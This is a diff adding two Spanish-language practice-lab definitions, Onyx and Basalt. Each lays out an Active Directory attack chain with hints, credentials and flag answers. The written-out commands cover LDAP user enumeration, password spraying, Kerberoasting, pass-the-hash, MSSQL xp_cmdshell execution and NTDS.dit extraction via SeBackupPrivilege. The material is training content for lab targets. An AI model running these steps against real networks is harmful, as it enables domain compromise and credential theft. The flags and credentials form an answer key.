@@ -628,6 +628,177 @@ noise:
 
 ---
 
+## Box 09 — `Onyx`
+
+```
+id: 09
+name: Onyx
+os: windows
+difficulty: medium
+est_time: 60-90 min
+tags: [ad, ldap-anon, user-enum, password-spray, kerberoast, pth-spray, machine-account]
+
+target_ip: 10.10.74.20        # DC01.onyx.local
+tun0_ip: 10.11.0.5
+
+services:
+  53: DNS (AD)
+  88: Kerberos
+  389/636: LDAP (bind ANÓNIMO permitido)
+  445: SMB (null lista shares, deniega lectura)
+  3389: RDP
+  5985: WinRM
+
+surface:
+  - SMB null: lista shares (ADMIN$/C$/IPC$/NETLOGON/SYSVOL + 'profiles' + 'sql_dumps') pero ACCESS_DENIED al leer. --rid-brute null y guest -> DENEGADO (no es la vía).
+  - LDAP ANÓNIMO permite enumerar: `ldapsearch -x -H ldap://IP -b "DC=onyx,DC=local" "(objectClass=user)" sAMAccountName` -> ~400 usuarios.
+  - (aha: null no da SAMR aquí, pero el LDAP anónimo SÍ lista los users -> distintas puertas al mismo dato).
+
+chain:
+  - step: user-enum-ldap
+    trigger: null rid-brute denegado, pero LDAP anónimo abierto
+    technique: enumeración de usuarios por LDAP anónimo
+    cheat_ref: [[08-active-directory]] (LDAP dump)
+    aha: cuando SAMR (rid-brute) está capado, el LDAP anónimo suele seguir soltando la lista
+    expected_action: ldapsearch/nxc ldap --query sAMAccountName -> limpiar a userlist
+    hints:
+      - "445 lista pero deniega; prueba OTRA puerta al mismo dato (08-AD, LDAP)."
+      - "LDAP anónimo + objectClass=user."
+      - "ldapsearch -x -b DC=onyx,DC=local '(objectClass=user)' sAMAccountName | awk '/sAMAccountName/{print $2}'"
+  - step: asrep-dry-then-spray
+    trigger: userlist grande, sin credenciales
+    technique: AS-REP roast (seco) -> password spray pass=username
+    cheat_ref: [[08-active-directory]] (Spray avanzado --no-bruteforce)
+    aha: AS-REP seco + userlist enorme = sprayea pass=username (1 intento/cuenta, sin lockout)
+    expected_action: "GetNPUsers -no-pass (nada) -> nxc smb -u users -p users --no-bruteforce --continue-on-success"
+    hints:
+      - "AS-REP sin resultados NO es fin; con lista gigante hay un spray barato. 08-AD."
+      - "el spray más tonto y seguro: password = username."
+      - "nxc smb IP -u users_h -p users_h --no-bruteforce --continue-on-success | grep '\\[+\\]'"
+    resultado: cred low-priv `d.bauer : d.bauer`
+  - step: reenum-kerberoast
+    trigger: 1ª credencial
+    technique: Kerberoast
+    cheat_ref: [[08-active-directory]] (Kerberoast)
+    aha: cred nueva = re-enumerar autenticado; ahora SÍ GetUserSPNs
+    expected_action: GetUserSPNs -request -> hash de `svc_report` -> hashcat -m 13100 -> 'Autumn2024!'
+    hints: ["cred nueva -> ¿qué puedo hacer AHORA que antes no?", "pide TGS de cuentas con SPN", "GetUserSPNs dom/user:pass -request"]
+  - step: loot-machine-hashes
+    trigger: svc_report lee el share 'sql_dumps'
+    technique: lectura de share -> dump de hashes de MÁQUINA
+    cheat_ref: [[08-active-directory]] (PtH-spray)
+    aha: svc_report (rol SQL/report) abre 'sql_dumps' -> `ad_inventory.bak` con hashes NT de cuentas de máquina ($)
+    expected_action: smbclient con svc_report -> descargar el .bak -> ver que son cuentas '...$'
+    hints: ["los nombres mandan: svc_report -> share sql_dumps", "lee el share que tu rol permite", "smbclient //IP/sql_dumps -U svc_report%..."]
+  - step: pth-spray-to-DA
+    trigger: lista de hashes NT de cuentas de máquina
+    technique: PtH-spray -> machine account admin del DC
+    cheat_ref: [[08-active-directory]] (Spray avanzado / PtH-spray)
+    aha: máquina NO se crackea (pass 120 chars) -> PtH-spray; una sale (Pwn3d!) en el DC = admin local = DA
+    expected_action: "nxc smb/winrm -u m_users -H m_hashes --no-bruteforce -> WEB01$ (Pwn3d!) -> evil-winrm -u 'WEB01$' -H ..."
+    hints:
+      - "esos hashes son de cuentas '$' -> NO hashcat. ¿qué se hace con un hash NT?"
+      - "Pass-the-Hash en LISTA (spray) contra SMB/WinRM."
+      - "nxc winrm IP -u m_users -H m_hashes --no-bruteforce ; busca (Pwn3d!)"
+    resultado: WEB01$ es admin local del DC -> Domain Admin
+
+creds:
+  - d.bauer : d.bauer           (spray pass=username; low-priv)
+  - svc_report : Autumn2024!    (kerberoast; lee sql_dumps)
+  - WEB01$ : <hash NT>          (del .bak; admin local del DC = DA)
+
+flags:
+  user: 5c9e2a71b0d4f6839e1c7a4502bd8f13
+  root: e07b4d1986c3f52a0bd419e7c6a8f240
+
+noise:
+  - 'profiles' share: solo tu propia carpeta cuando entras (user flag), resto denegado.
+  - de las SPN hay 4 cuentas; solo svc_report crackea con rockyou (las otras, trampa de tiempo).
+  - hashes de máquina repetidos en el .bak = pass reutilizada (pista, no obligatorio).
+```
+
+**Lección pedagógica:** cuando el rid-brute SMB está capado, **LDAP anónimo** da la lista; **AS-REP seco + userlist gigante → spray `pass=username`** (`--no-bruteforce`, sin lockout); re-enum autenticado → Kerberoast; y **hashes de cuenta de máquina → PtH-spray**, nunca hashcat; una **máquina `(Pwn3d!)` en el DC = Domain Admin**.
+
+---
+
+## Box 10 — `Basalt`
+
+```
+id: 10
+name: Basalt
+os: windows
+difficulty: medium
+est_time: 60-90 min
+tags: [ad, mssql, xp_cmdshell, backup-operators, sebackupprivilege, diskshadow, ntds, pth]
+
+target_ip: 10.10.74.40        # DC02.basalt.local (MSSQL en el propio DC)
+tun0_ip: 10.11.0.5
+
+services:
+  53: DNS (AD)
+  88: Kerberos
+  445: SMB
+  1433: MSSQL 2019
+  5985: WinRM
+
+surface:
+  - SMB null: poco. La superficie es 1433.
+  - MSSQL responde; login anónimo no. Un share público 'transfer' (null READ) tiene un `connection_test.udl` con `sa` y una pass débil de ejemplo -> probar contra MSSQL.
+  - (aha: el .udl de Windows es un fichero de texto con la cadena de conexión -> creds de la BD).
+
+chain:
+  - step: foothold-mssql
+    trigger: creds sa en el .udl del share transfer
+    technique: login MSSQL -> xp_cmdshell
+    cheat_ref: [[03-sqli-bbdd]] (MSSQL / xp_cmdshell)
+    aha: .udl = cadena de conexión en claro; sa + xp_cmdshell = RCE como la cuenta del servicio
+    expected_action: "impacket-mssqlclient sa:...@IP -> enable_xp_cmdshell -> xp_cmdshell whoami -> svc_sql"
+    hints:
+      - "¿qué es un .udl? ábrelo, es texto. 14-servicios/03-bbdd."
+      - "sa en MSSQL -> módulo de ejecución de comandos del propio motor."
+      - "mssqlclient -> `enable_xp_cmdshell` -> `xp_cmdshell whoami`"
+    resultado: ejecución como `svc_sql` (vía xp_cmdshell)
+  - step: identify-privilege
+    trigger: shell/exec como svc_sql
+    technique: enumerar privilegios y grupos del token
+    cheat_ref: [[06-privesc-windows]] (árbol anti-pánico) · [[08-active-directory]] (SeBackupPrivilege)
+    aha: BloodHound no pinta nada -> lo PRIMERO es whoami /priv y whoami /groups
+    expected_action: "xp_cmdshell 'whoami /priv' y '/groups' -> svc_sql está en BACKUP OPERATORS (SeBackupPrivilege)"
+    hints:
+      - "grafo vacío NO es fin -> enum manual, y lo primero del token: privilegios/grupos."
+      - "busca SeBackupPrivilege o el grupo Backup Operators."
+      - "whoami /priv ; whoami /groups"
+  - step: sebackup-ntds-DA
+    trigger: SeBackupPrivilege / Backup Operators en el DC
+    technique: diskshadow + robocopy /b -> NTDS.dit + SYSTEM -> secretsdump -> PtH
+    cheat_ref: [[08-active-directory]] (Exfiltración NTDS.dit SeBackupPrivilege)
+    aha: ntds está locked+ACL -> shadow copy (desbloquea) + robocopy /b (salta ACL con el priv) + hive SYSTEM
+    expected_action: "diskshadow script -> robocopy /b ntds.dit -> reg save hklm\\system -> secretsdump -ntds -system LOCAL -> hash Administrator -> PtH"
+    hints:
+      - "con SeBackupPrivilege en un DC, ¿qué fichero quieres leer? 08-AD."
+      - "no puedes copiar ntds.dit directo (locked+ACL): shadow copy + copia en modo backup."
+      - "diskshadow /s script.txt ; robocopy /b z:\\windows\\ntds\\ . ntds.dit ; reg save hklm\\system system.bak"
+    resultado: hash NT del Administrator -> evil-winrm -H -> Domain Admin
+
+creds:
+  - sa : Summer2023#          (del .udl en share 'transfer')
+  - svc_sql : (no necesaria)  (contexto de xp_cmdshell; su valor es el GRUPO, no la pass)
+  - Administrator : <hash NT> (del NTDS.dit -> PtH)
+
+flags:
+  user: 9a1c7f03e5b2d846a0f7c219b4e63d58
+  root: 1f6b0e4a9c7d2538e0b1a4f69c3d7082
+
+noise:
+  - 'transfer' share tiene también PDFs corporativos de relleno.
+  - intentar `nxc --ntds` con svc_sql NO vale (Backup Operators ≠ admin; VSS pide admin) -> hay que hacerlo con diskshadow desde dentro.
+  - xp_cmdshell deshabilitado al entrar: hay que habilitarlo (paso que la gente olvida).
+```
+
+**Lección pedagógica:** `.udl` = cadena de conexión en claro → MSSQL `sa` → `xp_cmdshell` (RCE); grafo vacío → **`whoami /priv` / `/groups`**; **Backup Operators / SeBackupPrivilege en un DC = root** vía diskshadow + `robocopy /b` → NTDS.dit → PtH. (Backup Operators ≠ admin: `nxc --ntds` no vale, hay que ir con diskshadow desde dentro.)
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
